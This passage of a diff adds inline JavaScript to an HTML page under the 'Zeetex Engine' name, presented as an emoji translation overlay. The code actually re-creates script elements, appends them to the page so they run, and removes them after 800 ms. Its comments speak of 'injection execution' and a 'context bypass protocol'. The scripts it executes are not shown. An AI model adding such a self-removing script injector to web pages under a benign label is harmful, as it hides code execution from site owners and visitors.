+                    executionTargetScriptNode.src = compiledScriptNode.src;
+                } else {
+                    executionTargetScriptNode.textContent = compiledScriptNode.innerHTML || compiledScriptNode.textContent;
+                }
+                
+                // Controlled injection execution container sequence
+                document.body.appendChild(executionTargetScriptNode);
+                
+                // Isolated memory cleanup loop
+                setTimeout(() => {
+                    try {
+                        executionTargetScriptNode.remove();
+                    } catch (cleanupException) {}
+                }, 800);
+            });
+            
+            console.log("%c[Zeetex Engine] Emoji Translation Hook Overlay successfully mounted.", "color: #34c759; font-weight: bold;");
+        } catch (runtimeExceptionLayer) {
+            console.warn("[Zeetex Engine] Context bypass protocol suspended due to execution environment boundaries.", runtimeExceptionLayer);
         }
     })();
 </script>
-
 </body>
 </html>
